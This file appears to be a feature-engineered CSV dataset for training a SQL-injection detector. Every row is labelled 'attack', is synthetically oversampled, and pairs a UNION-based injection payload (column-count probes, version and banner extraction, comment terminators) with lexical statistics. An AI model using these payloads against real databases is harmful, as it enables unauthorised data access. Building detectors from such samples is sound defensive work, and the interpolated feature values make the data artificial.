id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000116,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000113,0.8791923001989742,83.80965417091514,29.17462055612202,4.296122955830014,33.698482224488075,22.349241112244037,16.17462055612202,11.58731027806101,0.4010231401303802,0.26666666666666666,0.19347433024376656,0.13883586295918654,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.5873102780610098,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.5873102780610097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.587310278061009
SMOTE_000117,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R000181,0.019042725412904617,99.91786032760493,29.976531522172838,4.091546313090642,25.0,40.0,21.929594566518514,12.988265761086419,0.2502208055709545,0.40035328891352717,0.219437261230596,0.12998864428492235,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.988265761086419,0.0,0.0,6.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000009,0.16858785809263652,83.0,28.61482330206729,3.98527194224334,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.3851766979327098,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000119,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000219,0.8309025840185028,88.1521856643482,23.0,3.760953429092259,25.0,36.921748531478556,16.0,10.230437132869639,0.2855412821713974,0.41623251676164186,0.18274642058969437,0.11547978047726637,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.230437132869638,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,union,"-8355%""   )    )     )   union all select 3004,3004,3004,3004,3004,3004,3004--",nearest_attack_euclidean,R000292,0.18497891780367462,78.44389220142732,21.177556880570926,3.642442224366286,14.0,32.7102275222837,17.64488623885815,14.088778440285463,0.17852726431572716,0.4166192765357514,0.22525657507031882,0.17959688407820262,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.9112215597145377,1.0,0.0,6.177556880570926,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000012,1.208580673624142,99.5922613022904,26.0,4.04098467498335,62.0,5.0,24.0,8.592261302290392,0.6225535150765653,0.05020592863520684,0.240988457448993,0.08625209883923492,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.592261302290392,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5922613022903916,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000122,attack,union,"-5058%' union all select 6789,6789,6789,6789,6789#",nearest_attack_euclidean,R000141,0.023331095023647608,49.969425351242776,22.0,4.102449880549555,14.0,23.975540280994224,4.0,7.993885070248556,0.28019024225893385,0.4797825802755042,0.08005435493112394,0.15997282253443804,0.9938850702485558,0.006114929751444231,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.993885070248556,1.0,0.9938850702485558,0.006114929751444231,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,1.314295732036693,73.75702169398706,31.378510846993528,4.35456705058187,44.0,2.378510846993528,17.0,10.378510846993526,0.5966558987149899,0.032167533962110195,0.230526142685337,0.1406504246375629,0.0,0.0,2.0,0.0,1.6214891530064737,1.0,0.0,1.1102230246251565e-16,0.3785108469935263,0.0,1.0,5.378510846993526,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union,"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",nearest_attack_euclidean,R000131,0.5214895550622757,71.02079095833002,25.236517115195884,3.9867774150143496,25.0,21.892136921567072,17.419102691175304,6.709551345587652,0.3552736720045752,0.3067443771461253,0.244269229739777,0.09371272110952247,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.236517115195884,0.0,0.0,1.4730342303917685,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000143,0.020884878238233893,98.08280432732937,27.0,4.015690517565947,25.0,44.0,16.07097513771089,13.011829189618481,0.2549008641221347,0.448625520854957,0.16381250673065081,0.13266110829225747,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.011829189618481,0.0,0.0,7.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000028,1.1471686681176927,102.0,27.553495491682973,4.155328190260293,62.0,4.223252254158513,23.223252254158513,12.553495491682972,0.6078431372549019,0.041404433864299206,0.22767894366822072,0.12307348521257816,3.0,1.5534954916829724,2.0,0.0,1.2232522541585138,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,1.0,0.7767477458414862,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000127,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000037,0.3014905445709822,99.0,25.854803500184463,4.025907253834759,62.0,5.0,24.0,8.0,0.6262626262626263,0.0505050505050505,0.24242424242424243,0.08080808080808083,0.0,0.0,2.0,0.0,1.1451964998155382,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000128,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.016749123093563682,111.89288260171091,27.982147100285154,3.974364596012563,65.92858840114062,4.0,31.98214710028515,9.982147100285152,0.5892075176225428,0.03575037648190332,0.28583458827301106,0.08920751762254278,0.0,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.0,5.982147100285152,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000129,attack,union,"-3359 union all select 4675,4675,4675--",nearest_attack_euclidean,R000294,1.1144162391150865,37.372973355483886,19.0,3.9973434778029575,14.0,13.396757368774203,5.301621315612897,4.674594671096775,0.3761526191728701,0.35332274788420204,0.1457551567775019,0.12476947616542598,0.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,0.3254053289032246,0.0,0.0,1.3491893421935512,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.3254053289032245,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000200,0.4353072035356509,70.3766568921662,25.07533137843324,4.149529298180268,27.0,24.30132551373296,11.0,8.075331378433239,0.38560620798184875,0.3429852349844756,0.15709882547408655,0.11430973155958916,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,4.07533137843324,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",nearest_attack_euclidean,R000146,0.4647699044772775,107.08905293972357,33.47124235177886,4.423208465592764,37.0,38.47124235177886,17.0,14.617810587944716,0.3456867538135346,0.3590158167567884,0.15882904904946182,0.13646838038021528,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.6178105879447156,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000132,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000072,0.7071564036076726,71.18987156750939,28.40144691892723,4.061695093408405,25.0,20.0,19.59131848643662,6.598553081072771,0.352007505206185,0.28160600416494797,0.2738161342297506,0.09257035639911643,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.5985530810727702,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000198,0.18358597064187304,108.21369130084733,26.213691300847337,3.924767873602916,25.0,51.572617398305326,16.641073902542015,15.0,0.23103179440057378,0.47666083597415093,0.15368829298493097,0.13861907664034429,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.1068456504236688,0.0,0.0,8.893154349576331,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000134,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000094,0.06702513623475724,106.62262161607921,27.0,4.0755973018178455,29.0,47.69809729286338,15.0,14.924524323215845,0.2725791293009193,0.446587059940877,0.14098920481082033,0.13984460594738332,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.924524323215845,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000065,0.12453006855681577,88.7525947460958,26.08362163845509,3.7941047504399106,46.25086491536527,3.0,29.334486553820355,10.167243276910177,0.5212578203176823,0.033826407657182866,0.33043692234060607,0.11447884968452877,0.0,1.0,2.0,0.0,1.0,1.0,0.0,3.0836216384550887,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000136,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000191,0.17869608900655123,101.25880807387354,29.748238385225292,4.151689673862789,62.00704645909883,9.0,17.0,13.251761614774708,0.6121743048548725,0.08897006612137617,0.16805456934037727,0.13080105968337408,3.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.251761614774707,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000137,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000081,0.6427184090824255,82.57544757300867,24.969820970796533,4.035166856441307,27.0,34.06035805840693,11.0,10.515089514601733,0.327273958165995,0.4121197532847467,0.13333383480836836,0.12727245374089,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,6.515089514601733,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.43482652709773173,69.36167358595924,20.0,3.534221803495095,14.0,39.36167358595923,4.0,12.0,0.2019343224667902,0.5672835947140209,0.05769552070479719,0.1730865621143916,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.15958160351019154,0.0,7.840418396489809,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-4406%' union all select 9599,9599,9599,9599#",nearest_attack_euclidean,R000220,0.2247878688609711,45.287510384467296,21.115004153786916,3.846245883033846,14.0,20.230008307573833,4.0,7.057502076893459,0.30932215760775905,0.44648896273398964,0.0883777593165026,0.1558111203417487,0.9424979231065416,0.057502076893458265,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.057502076893458,1.0,0.9424979231065416,0.057502076893458265,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000192,0.06943758748068486,39.71602817931547,19.056794364136906,3.949421443021576,14.0,15.772822543452373,4.0,5.943205635863094,0.3528397182068453,0.3967546077636054,0.10081134805909867,0.14959432597045066,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,1.9432056358630936,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000230,0.4550599348801266,104.7449814683237,27.7516728438921,4.035541209664224,29.0,44.993308624431606,15.0,15.751672843892099,0.2769047032187826,0.4294145320214453,0.14322657063040478,0.15045419412936728,2.5033456877841997,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.2483271561079015,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000142,attack,union,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",nearest_attack_euclidean,R000146,0.5692504364064843,104.79229039639165,34.158458079278326,4.46077705403607,37.0,36.63383231711332,17.0,14.15845807927833,0.35464427633549767,0.347588923161203,0.16294466750549894,0.13482213299780044,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.158458079278328,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000143,attack,union,"-8477' union all select 2517,2517,2517--",nearest_attack_euclidean,R000309,0.5776153828841405,39.17068848697546,20.0,4.09140875551003,14.0,15.17068848697546,4.0,6.0,0.3580627508210719,0.386178141449591,0.10230364309173484,0.15345546463760223,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.20732787825613463,0.0,1.7926721217438653,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000138,0.00017091115602429704,88.00097683330935,27.00008140277578,3.943940930419674,25.0,36.000325611103115,16.000488416654676,11.000162805551557,0.2840881339962803,0.40909016906567475,0.1818212899241661,0.1250004070138789,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.000081402775779,0.0,0.0,5.000081402775779,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000237,0.06886331035619199,84.61069000121427,26.155723999514294,4.031850809023837,25.0,27.688552000971413,22.0,9.922138000242853,0.2955489338190652,0.3271217058894957,0.2600830617607774,0.11724629853066174,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,2.922138000242853,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000295,0.10013800902149277,79.5780853225014,27.939726474643056,4.101373278951386,25.0,24.0,21.638358847858342,8.939726474643056,0.314306141598881,0.3017338959349257,0.2716354162215131,0.11232454624468013,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.939726474643057,0.0,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000052,0.24012787849168943,73.0,32.0,4.397938940737863,44.0,2.0,16.255674458126972,10.744325541873028,0.6027397260273972,0.0273972602739726,0.22268047202913657,0.14718254166949354,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.744325541873029,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
